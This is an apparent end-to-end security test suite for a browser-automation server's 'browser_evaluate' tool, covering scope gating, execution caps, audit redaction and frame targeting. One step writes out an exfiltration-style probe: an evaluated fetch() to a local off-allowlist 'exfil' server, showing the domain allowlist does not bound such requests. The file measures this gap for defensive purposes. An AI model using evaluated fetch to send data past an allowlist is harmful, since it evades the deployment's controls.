/**
 * B2.7 / SEC-02 / AC-SEC-11 — `browser_evaluate` on real Chromium, and the egress claim MEASURED.
 *
 * The security seed carried one belief it could not test: that an evaluated `fetch()` escapes all
 * three of the navigation allowlist's enforcement points. It follows from what a navigation is, and
 * the seed says so, but "close to certain" is not evidence — and `SPECS/SECURITY-AUTH.md` §8 now
 * carries a sentence about it, so the sentence needs a measurement behind it rather than a deduction.
 *
 * The shape of the measurement: the deployment's allowlist names **one** host (`127.0.0.1`), the
 * page is served from that host, and a second server on the *other* spelling of loopback
 * (`localhost`) counts what reaches it. `browser_navigate` to that second host is refused, which
 * proves the allowlist is live; the same host reached from inside an evaluated `fetch` is **not**
 * refused, and the counting server records the hit. Both halves are logged, because the evidence is
 * the pair.
 *
 * Browser tier — requires `--allow-run=<resolved chromium>`.
 */
import { assert, assertEquals, assertStringIncludes } from '@std/assert';
import { harness, skipUnlessBrowser, textOf } from '../support/harness.ts';
import { startFixtureSite } from '../fixtures/site.ts';

const ignore = skipUnlessBrowser('evaluate e2e');

/** The off-allowlist origin: the other spelling of loopback, which is a different host to the gate. */
const EXFIL_HOSTNAME = 'localhost';

interface Exfil {
	readonly origin: string;
	readonly hits: readonly string[];
	close(): Promise<void>;
}

/** A server on the off-allowlist host that records every path it is asked for. */
function exfilServer(): Exfil {
	const hits: string[] = [];
	const server = Deno.serve({ hostname: EXFIL_HOSTNAME, port: 0, onListen: () => {} }, (request) => {
		hits.push(new URL(request.url).pathname + new URL(request.url).search);
		// Permissive CORS on purpose: the point of the probe is that the *request leaves*, and a
		// blocked response would only prove that the browser hid the answer from the page.
		return new Response('ok', {
			headers: { 'access-control-allow-origin': '*', 'cache-control': 'no-store' },
		});
	});
	return {
		origin: `http://${EXFIL_HOSTNAME}:${(server.addr as Deno.NetAddr).port}`,
		hits,
		close: () => server.shutdown(),
	};
}

interface Evaluated {
	session_id: string;
	frame_id: string;
	ok: boolean;
	type: string;
	value?: unknown;
	truncated: boolean;
	error_text?: string;
	audit_id: string;
}

Deno.test({
	name: 'e2e evaluate (SEC-02, AC-SEC-11): the scope gate holds, and the allowlist does NOT bound an evaluated fetch',
	ignore,
	async fn(t) {
		const exfil = exfilServer();
		try {
			await t.step('without the grant the tool is absent from tools/list and a call is scope-required', async () => {
				// The default harness credential holds every scope EXCEPT `evaluate`, which is the whole
				// mechanism: `evaluate` is in SCOPES and not in DEFAULT_SCOPES, so a key minted without
				// naming it cannot reach the tool.
				await using h = await harness();
				const listed = (await h.client.listTools()).tools.map((tool) => tool.name);
				assert(
					!listed.includes('browser_evaluate'),
					`browser_evaluate must not be advertised without the grant: ${listed.join(', ')}`,
				);
				console.log(`[B2.7] tools/list without evaluate: ${listed.length} tools, browser_evaluate absent`);

				const refused = await h.call('browser_evaluate', { expression: '1' });
				assertEquals(refused.isError, true);
				const text = (refused.content as Array<{ text?: string }>)[0]?.text ?? '';
				assertStringIncludes(text, 'Error: scope-required: ');
				// SEC-17: the refusal never names the scope a caller would have to obtain.
				assert(!text.includes('evaluate scope'), text);
				console.log(`[B2.7] tools/call without the grant: ${text}`);
			});

			await t.step('with the grant it evaluates in the frame’s own MAIN world', async () => {
				await using h = await harness({ scopes: ['mcp:invoke', 'evaluate'] });
				const listed = (await h.client.listTools()).tools.map((tool) => tool.name);
				assert(listed.includes('browser_evaluate'), 'the grant must make the tool visible');

				await h.callText('browser_navigate', { url: h.site.page('form') });
				// A page global, set by the page's own script, is invisible to an isolated world and is
				// exactly the use case D-A4 declined the isolated world for. Reading it back is the proof
				// that the main world is what runs.
				const seeded = await h.call('browser_evaluate', {
					expression: 'globalThis.__ttk_probe = { seen: document.title.length > 0 }; "seeded"',
				});
				assertEquals(seeded.isError, undefined);
				const read = (await h.call('browser_evaluate', {
					expression: 'JSON.stringify(globalThis.__ttk_probe)',
				})).structuredContent as Evaluated;
				assertEquals(read.ok, true);
				console.log(`[B2.7] main-world page global read back: ${JSON.stringify(read.value)}`);
				assertEquals(read.value, '{"seen":true}');
			});

			await t.step(
				'SEC-02: the allowlist refuses navigation to the host and does NOT refuse a fetch to it',
				async () => {
					await using h = await harness({
						scopes: ['mcp:invoke', 'evaluate'],
						// One host. The fixture site is served from it; the counting server is not.
						env: { TTK_ALLOWED_DOMAINS: '127.0.0.1' },
					});
					await h.callText('browser_navigate', { url: h.site.page('form') });

					// Half one: the allowlist is LIVE. Without this the second half would prove nothing —
					// an allowlist that refuses nothing is not an allowlist that a fetch escaped.
					const blocked = await h.call('browser_navigate', { url: `${exfil.origin}/via-navigate` });
					assertEquals(blocked.isError, true);
					const blockedText = (blocked.content as Array<{ text?: string }>)[0]?.text ?? '';
					assertStringIncludes(blockedText, 'navigation-blocked');
					console.log(`[B2.7/SEC-02] browser_navigate to the off-allowlist host: ${blockedText}`);
					assertEquals(
						exfil.hits.filter((path) => path.startsWith('/via-navigate')).length,
						0,
						'a refused navigation must not reach the host at all',
					);

					// Half two: the same host, reached from inside an evaluated expression. No refusal, and
					// the request arrives. This is the measurement behind SECURITY-AUTH §8's sentence.
					const marker = `/via-evaluate?c=${crypto.randomUUID().slice(0, 8)}`;
					const evaluated = await h.call('browser_evaluate', {
						expression: `fetch(${JSON.stringify(exfil.origin + marker)}).then(r => r.status)`,
					});
					assertEquals(evaluated.isError, undefined, `the evaluated fetch was refused: ${JSON.stringify(evaluated)}`);
					const payload = evaluated.structuredContent as Evaluated;
					console.log(`[B2.7/SEC-02] browser_evaluate fetch result: ${JSON.stringify(payload)}`);

					// The request may arrive after the handler returned — a fire-and-forget `fetch` is the
					// cheaper exfiltration shape and the one the seed named — so wait for the hit rather
					// than assuming the awaited promise ordered it.
					const deadline = Date.now() + 5_000;
					while (Date.now() < deadline && !exfil.hits.some((path) => path.startsWith('/via-evaluate'))) {
						await new Promise((resolve) => setTimeout(resolve, 50));
					}
					console.log(`[B2.7/SEC-02] off-allowlist host received: ${JSON.stringify(exfil.hits)}`);
					assert(
						exfil.hits.some((path) => path === marker),
						`MEASURED: an evaluated fetch must reach a host TTK_ALLOWED_DOMAINS excludes — hits ${
							JSON.stringify(exfil.hits)
						}`,
					);
					console.log(
						'[B2.7/SEC-02] MEASURED: TTK_ALLOWED_DOMAINS refused the navigation and did NOT constrain the ' +
							'evaluated fetch. The domain allowlist is not an egress control for the evaluate scope.',
					);
				},
			);

			await t.step('the caps hold on a real renderer: 1 s deadline and the 64 KiB result cap', async () => {
				await using h = await harness({ scopes: ['mcp:invoke', 'evaluate'] });
				await h.callText('browser_navigate', { url: h.site.page('form') });

				const started = Date.now();
				const wedged = await h.call('browser_evaluate', {
					expression: 'const end = Date.now() + 30000; while (Date.now() < end) {} "never"',
				});
				const elapsed = Date.now() - started;
				const wedgedText = (wedged.content as Array<{ text?: string }>)[0]?.text ?? '';
				console.log(`[B2.7] a 30 s busy loop answered in ${elapsed} ms: ${wedgedText.slice(0, 120)}`);
				assertEquals(wedged.isError, true, `a wedged expression must not succeed: ${wedgedText}`);
				assertStringIncludes(wedgedText, 'timeout');
				assert(elapsed < 10_000, `the 1 s cap did not bound a 30 s loop: ${elapsed} ms`);

				const big = (await h.call('browser_evaluate', {
					expression: '"x".repeat(500000)',
				})).structuredContent as Evaluated;
				console.log(
					`[B2.7] a 500 000-character result: truncated=${big.truncated} length=${
						typeof big.value === 'string' ? big.value.length : 'n/a'
					}`,
				);
				assertEquals(big.truncated, true);
				assert(typeof big.value === 'string' && big.value.length <= 64 * 1024);

				// A page exception is a fact about the page, not a tool failure.
				const threw = await h.call('browser_evaluate', { expression: 'nope_not_defined()' });
				assertEquals(threw.isError, undefined);
				const thrown = threw.structuredContent as Evaluated;
				assertEquals(thrown.ok, false);
				assert((thrown.error_text ?? '').length > 0);
				console.log(`[B2.7] a page exception: ok=${thrown.ok} error_text=${(thrown.error_text ?? '').slice(0, 80)}`);
			});

			await t.step('every call writes one audit entry, and the expression body is not in it', async () => {
				await using h = await harness({ scopes: ['mcp:invoke', 'evaluate', 'admin'] });
				await h.callText('browser_navigate', { url: h.site.page('form') });
				const sentinel = 'Zq8-E2E-EXPR-SENTINEL-3vP';
				const first = (await h.call('browser_evaluate', {
					expression: `(() => { const marker = ${JSON.stringify(sentinel)}; return marker.length; })()`,
				})).structuredContent as Evaluated;
				assertEquals(first.ok, true);
				assertEquals(first.value, sentinel.length);

				const record = h.gateway.registry.peek('default');
				assert(record !== undefined);
				const ledger = record.audit.read({ principal: 'e2e', all: true });
				console.log(`[B2.7] audit ledger after one call: ${JSON.stringify(ledger)}`);
				assertEquals(ledger.entries.length, 1);
				const entry = ledger.entries[0];
				assert(entry !== undefined);
				assertEquals(entry.audit_id, first.audit_id);
				assertEquals(entry.kind, 'evaluate');
				assertEquals(entry.ok, true);
				assertEquals(entry.expression_digest?.length, 16);
				assert((entry.expression_bytes ?? 0) > 0);
				const serialized = JSON.stringify(ledger);
				assert(!serialized.includes(sentinel), `the expression body reached the ledger: ${serialized}`);
				assert(!serialized.includes('marker'), `an expression fragment reached the ledger: ${serialized}`);
				// The origin is the frame's, reduced — never a full URL, which may carry a token.
				assertEquals(entry.origin, new URL(h.site.url).origin);
			});

			await t.step(
				'C-14 / E-75: an evaluation in a same-process CHILD frame reaches the child, and the ledger says so',
				async () => {
					// Same host, **different port**: the port is not part of a *site*, so Chromium keeps the
					// frame in the host's renderer — and it IS part of an *origin*, so the audit's `origin`
					// can distinguish the child from the top document at all. That is SEC-FH-1's
					// counter-example shape, and it is the only shape in which this row can fail: for a
					// same-origin child the assertion would be true whichever document the code read.
					const sameSite = startFixtureSite({ hostname: '127.0.0.1' });
					try {
						await using h = await harness({
							scopes: ['mcp:invoke', 'evaluate', 'admin'],
							site: { frameOrigin: sameSite.url.replace(/\/$/, '') },
						});
						await h.callText('browser_navigate', { url: h.site.page('oopif') });
						const frames = await h.callJson<
							{ frames: Array<{ id: string; url: string; is_oopif: boolean }> }
						>('browser_get_frames', {});
						const top = frames.frames[0];
						const child = frames.frames.find((frame) => frame.url.endsWith('/frame'));
						assert(top !== undefined && child !== undefined, JSON.stringify(frames.frames));
						console.log(
							`[B2.7/C-14] top=${top.url} child=${child.url} is_oopif=${child.is_oopif}`,
						);
						assertEquals(child.is_oopif, false, 'a different PORT on the same host is the same site: one renderer');
						assert(new URL(child.url).origin !== new URL(top.url).origin, 'the child must be cross-ORIGIN');

						// The host document has no `#frame-marker`, so an expression that finds one has
						// provably run in the child. Before E-75's repair this same call ran in the host.
						const inChild = await h.call('browser_evaluate', {
							frame_id: child.id,
							expression: 'document.getElementById("frame-marker").textContent',
						});
						assertEquals(inChild.isError, undefined, textOf(inChild));
						const value = inChild.structuredContent as { ok: boolean; value?: unknown; frame_id: string };
						console.log(`[B2.7/C-14] browser_evaluate {frame_id} -> ${JSON.stringify(value.value)}`);
						assertEquals(value.ok, true);
						assertEquals(value.value, `frame ${sameSite.nonce}`);
						assertEquals(value.frame_id, child.id);

						// The contrast, so the row cannot pass by the id being ignored: the same expression
						// with no `frame_id` runs in the host document, where the element does not exist.
						const inHost = await h.call('browser_evaluate', {
							expression: 'document.getElementById("frame-marker").textContent',
						});
						const hostValue = inHost.structuredContent as { ok: boolean; error_text?: string };
						console.log(`[B2.7/C-14] the same expression with no frame_id: ok=${hostValue.ok}`);
						assertEquals(hostValue.ok, false, 'the host document must not answer for the child');

						const record = h.gateway.registry.peek('default');
						assert(record !== undefined);
						const ledger = record.audit.read({ principal: 'e2e', all: true });
						const row = ledger.entries.find((entry) => entry.frame_id === child.id);
						assert(row !== undefined, JSON.stringify(ledger));
						console.log(`[B2.7/C-14] the ledger row for the child frame: ${JSON.stringify(row)}`);
						// C-14: the ledger's origin is the CHILD's, not the top document's. Reading a frame
						// and recording someone else's origin against it is a false audit trail, which is
						// worse than none.
						assertEquals(row.origin, new URL(sameSite.url).origin);
						assert(row.origin !== new URL(h.site.url).origin, 'the ledger recorded the TOP origin (E-75)');
					} finally {
						await sameSite.close();
					}
				},
			);
		} finally {
			await exfil.close();
		}
	},
});
